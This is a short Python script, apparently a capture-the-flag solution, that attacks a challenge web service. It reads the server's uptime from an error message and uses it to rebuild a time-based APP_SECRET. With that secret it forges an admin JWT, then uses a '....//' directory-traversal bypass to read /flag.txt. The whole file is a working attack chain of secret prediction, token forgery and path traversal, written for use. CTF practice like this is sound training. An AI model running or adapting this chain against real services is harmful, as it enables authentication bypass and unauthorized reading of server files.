import requests
import time
import hashlib
import jwt

# Step 1: Get uptime from error message
url = "http://ctf.asgama.online:40004/api/files"
response = requests.get(url)
uptime = int(response.text.split("seconds")[0].split()[-1])

# Step 2: Compute APP_SECRET
current_time = int(time.time())
time_started = current_time - uptime
APP_SECRET = hashlib.sha256(str(time_started).encode()).hexdigest()

# Step 3: Forge admin JWT
forged_token = jwt.encode({"userid": 0}, APP_SECRET, algorithm="HS256")

# Step 4: Read /flag.txt with directory traversal bypass
cookies = {"session": forged_token}
response = requests.get(
    "http://ctf.asgama.online:40004/api/file?filename=....//flag.txt",
    cookies=cookies
)

print("Flag:", response.text)